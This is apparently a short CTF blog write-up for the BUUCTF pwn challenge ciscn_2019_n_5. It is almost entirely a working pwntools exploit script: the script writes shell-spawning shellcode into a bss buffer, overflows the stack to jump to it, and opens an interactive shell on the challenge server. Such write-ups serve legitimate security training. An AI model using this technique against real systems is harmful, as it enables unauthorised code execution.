---
title: "BUUCTF Pwn Ciscn_2019_n_5"
date: 2020-03-28T15:53:49+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Ciscn_2019_n_5

64位，bss写shellcode，栈溢出

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-

from pwn import *
context(os='linux',arch='amd64', log_level = 'debug')
#sh = process('./ciscn_2019_n_5')
sh = remote('node3.buuoj.cn',27055)
elf = ELF('./ciscn_2019_n_5')

bss_addr = 0x601080
shellcode = asm(shellcraft.sh())#生成64位linuxshellcode
payload = 'a'*0x20 + 'a'*8 + p64(0x601080)#栈溢出ret到shellcode执行

sh.sendlineafter("name\n",shellcode)
sh.sendlineafter("me?\n",payload)
sh.sendline('cat flag')
sh.interactive()
```

